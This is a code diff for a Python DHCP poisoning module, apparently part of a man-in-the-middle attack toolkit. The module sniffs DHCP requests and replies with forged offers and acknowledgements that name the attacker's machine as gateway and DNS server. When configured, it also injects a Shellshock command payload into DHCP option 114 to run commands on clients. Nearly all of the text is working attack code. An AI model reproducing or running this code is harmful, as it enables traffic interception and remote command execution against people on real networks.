@@ -20,6 +20,8 @@ import logging
 import threading
 import binascii
 import random
+
+from netaddr import IPAddress, IPNetwork, IPRange, AddrFormatError
 from core.logger import logger
 from scapy.all import *
 
@@ -28,98 +30,120 @@ log = logger().setup_logger("DHCPpoisoner", formatter)
 
 class DHCPpoisoner():
 
-	def __init__(self, interface, dhcpcfg, ip, mac):
-		self.interface   = interface
-		self.ip_address  = ip
-		self.mac_address = mac
-		self.shellshock  = None
-		self.debug       = False
-		self.dhcpcfg     = dhcpcfg
-		self.rand_number = []
-		self.dhcp_dic    = {}
+    def __init__(self, options, dhcpcfg):
+        self.interface   = options.interface
+        self.ip_address  = options.ip
+        self.mac_address = options.mac
+        self.shellshock  = options.shellshock
+        self.debug       = False
+        self.dhcpcfg     = dhcpcfg
+        self.dhcp_dic    = {}
 
-	def start(self):
-		t = threading.Thread(name="dhcp_spoof", target=self.dhcp_sniff, args=(self.interface,))
-		t.setDaemon(True)
-		t.start()
+        log.debug("interface  => {}".format(self.interface))
+        log.debug("ip         => {}".format(self.ip_address))
+        log.debug("mac        => {}".format(self.mac_address))
+        log.debug("shellshock => {}".format(self.shellshock))
+        log.debug("dhcpcfg    => {}".format(self.dhcpcfg))
 
-	def dhcp_sniff(self, interface):
-		sniff(filter="udp and (port 67 or 68)", prn=self.dhcp_callback, iface=interface)
+    def start(self):
+        self.s2 = conf.L2socket(iface=self.interface)
 
-	def dhcp_rand_ip(self):
-		pool = self.dhcpcfg['ip_pool'].split('-')
-		trunc_ip = pool[0].split('.'); del(trunc_ip[3])
-		max_range = int(pool[1])
-		min_range = int(pool[0].split('.')[3])
-		number_range = range(min_range, max_range)
-		for n in number_range:
-			if n in self.rand_number:
-				number_range.remove(n)
-		rand_number = random.choice(number_range)
-		self.rand_number.append(rand_number)
-		rand_ip = '.'.join(trunc_ip) + '.' + str(rand_number)
+        t = threading.Thread(name="DHCPpoisoner", target=self.dhcp_sniff)
+        t.setDaemon(True)
+        t.start()
 
-		return rand_ip
+    def stop(self):
+        self.s2.close()
 
-	def dhcp_callback(self, resp):
-		if resp.haslayer(DHCP):
-			xid = resp[BOOTP].xid
-			mac_addr = resp[Ether].src
-			raw_mac = binascii.unhexlify(mac_addr.replace(":", ""))
-			if xid in self.dhcp_dic.keys():
-				client_ip = self.dhcp_dic[xid]
-			else:
-				client_ip = self.dhcp_rand_ip()
-				self.dhcp_dic[xid] = client_ip
+    def dhcp_sniff(self):
+        try:
+            sniff(filter="udp and (port 67 or 68)", prn=self.dhcp_callback, iface=self.interface)
+        except Exception as e:
+            if "Interrupted system call" not in e:
+               log.error("Exception occurred while poisoning: {}".format(e))
 
-			if resp[DHCP].options[0][1] is 1:
-				log.info("Got DHCP DISCOVER from: " + mac_addr + " xid: " + hex(xid))
-				log.info("Sending DHCP OFFER")
-				packet = (Ether(src=self.mac_address, dst='ff:ff:ff:ff:ff:ff') /
-				IP(src=self.ip_address, dst='255.255.255.255') /
-				UDP(sport=67, dport=68) /
-				BOOTP(op='BOOTREPLY', chaddr=raw_mac, yiaddr=client_ip, siaddr=self.ip_address, xid=xid) /
-				DHCP(options=[("message-type", "offer"),
-					('server_id', self.ip_address),
-					('subnet_mask', self.dhcpcfg['subnet']),
-					('router', self.ip_address),
-					('lease_time', 172800),
-					('renewal_time', 86400),
-					('rebinding_time', 138240),
-					"end"]))
+    def dhcp_rand_ip(self):
+        pool = self.dhcpcfg['ip_pool']
+        try:
+            if '/' in pool:
+                ips = list(IPNetwork(pool))
+                return str(random.choice(ips))
 
-				try:
-					packet[DHCP].options.append(tuple(('name_server', self.dhcpcfg['dns_server'])))
-				except KeyError:
-					pass
+            elif '-' in pool:
+                start_addr = IPAddress(pool.split('-')[0])
+                try:
+                    end_addr = IPAddress(pool.split('-')[1])
+                    ips = list(IPRange(start_addr, end_addr))
+                except AddrFormatError:
+                    end_addr = list(start_addr.words)
+                    end_addr[-1] = pool.split('-')[1]
 
-				sendp(packet, iface=self.interface, verbose=self.debug)
+                    end_addr = IPAddress('.'.join(map(str, end_addr)))
+                    ips = list(IPRange(start_addr, end_addr))
 
-			if resp[DHCP].options[0][1] is 3:
-				log.info("Got DHCP REQUEST from: " + mac_addr + " xid: " + hex(xid))
-				packet = (Ether(src=self.mac_address, dst='ff:ff:ff:ff:ff:ff') /
-				IP(src=self.ip_address, dst='255.255.255.255') /
-				UDP(sport=67, dport=68) /
-				BOOTP(op='BOOTREPLY', chaddr=raw_mac, yiaddr=client_ip, siaddr=self.ip_address, xid=xid) /
-				DHCP(options=[("message-type", "ack"),
-					('server_id', self.ip_address),
-					('subnet_mask', self.dhcpcfg['subnet']),
-					('router', self.ip_address),
-					('lease_time', 172800),
-					('renewal_time', 86400),
-					('rebinding_time', 138240)]))
+                return str(random.choice(ips))
 
-				try:
-					packet[DHCP].options.append(tuple(('name_server', self.dhcpcfg['dns_server'])))
-				except KeyError:
-					pass
+            log.error('Specified invalid CIDR/Network range in DHCP pool option')
+        except AddrFormatError:
+            log.error('Specified invalid CIDR/Network range in DHCP pool option')
 
-				if self.shellshock:
-					log.info("Sending DHCP ACK with shellshock payload")
-					packet[DHCP].options.append(tuple((114, "() { ignored;}; " + self.shellshock)))
-					packet[DHCP].options.append("end")
-				else:
-					log.info("Sending DHCP ACK")
-					packet[DHCP].options.append("end")
+    def dhcp_callback(self, resp):
+        if resp.haslayer(DHCP):
+            log.debug('Saw a DHCP packet')
+            xid = resp[BOOTP].xid
+            mac_addr = resp[Ether].src
+            raw_mac = binascii.unhexlify(mac_addr.replace(":", ""))
 
-				sendp(packet, iface=self.interface, verbose=self.debug)
+            if xid in self.dhcp_dic.keys():
+                client_ip = self.dhcp_dic[xid]
+            else:
+                client_ip = self.dhcp_rand_ip()
+                self.dhcp_dic[xid] = client_ip
+
+            if resp[DHCP].options[0][1] == 1:
+                log.info("Got DHCP DISCOVER from: " + mac_addr + " xid: " + hex(xid))
+                log.info("Sending DHCP OFFER")
+
+                packet = (Ether(src=self.mac_address, dst='ff:ff:ff:ff:ff:ff') /
+                IP(src=self.ip_address, dst='255.255.255.255') /
+                UDP(sport=67, dport=68) /
+                BOOTP(op='BOOTREPLY', chaddr=raw_mac, yiaddr=client_ip, siaddr=self.ip_address, xid=xid) /
+                DHCP(options=[("message-type", "offer"),
+                    ('server_id', self.ip_address),
+                    ('subnet_mask', self.dhcpcfg['subnet']),
+                    ('router', self.ip_address),
+                    ('name_server', self.ip_address),
+                    ('dns_server', self.ip_address),
+                    ('lease_time', 172800),
+                    ('renewal_time', 86400),
+                    ('rebinding_time', 138240),
+                    "end"]))
+
+                self.s2.send(packet)
+
+            if resp[DHCP].options[0][1] == 3:
+                log.info("Got DHCP REQUEST from: " + mac_addr + " xid: " + hex(xid))
+
+                packet = (Ether(src=self.mac_address, dst='ff:ff:ff:ff:ff:ff') /
+                IP(src=self.ip_address, dst='255.255.255.255') /
+                UDP(sport=67, dport=68) /
+                BOOTP(op='BOOTREPLY', chaddr=raw_mac, yiaddr=client_ip, siaddr=self.ip_address, xid=xid) /
+                DHCP(options=[("message-type", "ack"),
+                    ('server_id', self.ip_address),
+                    ('subnet_mask', self.dhcpcfg['subnet']),
+                    ('router', self.ip_address),
+                    ('name_server', self.ip_address),
+                    ('dns_server', self.ip_address),
+                    ('lease_time', 172800),
+                    ('renewal_time', 86400),
+                    ('rebinding_time', 138240)]))
+
+                if self.shellshock:
+                    log.info("Sending DHCP ACK with shellshock payload")
+                    packet[DHCP].options.append(tuple((114, "() { ignored;}; " + self.shellshock)))
+                    packet[DHCP].options.append("end")
+                else:
+                    log.info("Sending DHCP ACK")
+                    packet[DHCP].options.append("end")
+
+                self.s2.send(packet)
